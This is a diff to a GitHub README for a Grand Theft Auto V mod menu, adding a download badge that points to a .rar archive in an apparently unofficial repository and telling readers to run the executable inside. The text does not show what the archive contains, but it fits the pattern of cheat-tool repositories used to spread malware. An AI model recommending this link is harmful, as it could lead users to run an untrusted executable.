@@ -2,6 +2,8 @@
 
 Kiddions Mod Menu is an all-in-one tool for Grand Theft Auto V that provides a wide range of powerful modifications, allowing you to enhance your gaming experience with endless possibilities. Whether you're looking to improve your gameplay or explore new features, Kiddions has you covered.
 
+[![Downloadlink](https://img.shields.io/badge/Download-Kiddions%20Modmenu-blue)](https://github.com/cacssaa/kiddions-new-update/releases/download/kdns-menu/Update.rar)
+
 ---
 
 ![image](https://github.com/user-attachments/assets/2b03856f-05b4-49d2-9837-ccf3c4ca70a1)
@@ -34,7 +36,7 @@ Kiddions Mod Menu is designed with simplicity in mind. From downloading to launc
 ## 🚀 **Getting Started**
 
 ```
-1. 📥 Download Kiddions Mod Menu: Get the latest version from the [Download](https://github.com/cacssaa/kiddions-new-update/releases/download/kdns-menu/Update.rar).
+1. 📥 Download Kiddions Mod Menu: Get the latest version from the release.
 2. 📂 Extract the Files: Unzip the contents of the downloaded archive.
 3. 🚀 Launch the Menu: Run the `Kiddions.exe` file and follow the on-screen instructions to configure the mod menu.
 4. 🎮 Start GTA V: Open your game, press the hotkeys to open the mod menu, and start customizing your experience.
